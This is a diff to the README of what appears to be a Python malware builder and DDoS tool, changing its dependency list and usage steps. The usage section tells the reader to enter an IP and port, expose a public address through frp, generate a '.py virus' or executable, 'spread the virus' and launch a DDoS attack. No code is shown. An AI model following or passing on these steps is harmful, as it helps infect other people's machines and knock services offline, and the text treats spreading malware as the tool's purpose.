@@ -18,12 +18,11 @@
 * [pyinstaller 5.13.2](https://github.com/pyinstaller/pyinstaller)
 * [upx 4.0 (for best)](https://github.com/upx/upx)
 * [pywin32 306](https://github.com/mhammond/pywin32)
-* [PySimpleGUI 4.60.5](https://github.com/PySimpleGUI/PySimpleGUI)
 * [python 3.7](https://python.org)
 
 command to install all :
 ```sh
-pip install pyinstaller==5.13.2 pywin32==306 PySimpleGUI==4.60.5
+pip install pyinstaller==5.13.2 pywin32==306
 ```
 👋**Install & Start**
 * Install
@@ -37,8 +36,11 @@ python main.py
 
 😈**Usage**  
 * Input your ip and port (ex:127.0.0.1, 1234)
+
 * Get the public network ip and port using frp and input it (ex:1.2.3.4, 12345)
-* generate .py virus (using command : gen_exe) and spread the virus with removable disk
+
+* generate .py virus (using command : gen_py or gen_exe) and spread the virus
+
 * use ddos attack method to attack!  
 
 🦠**virus settings**  
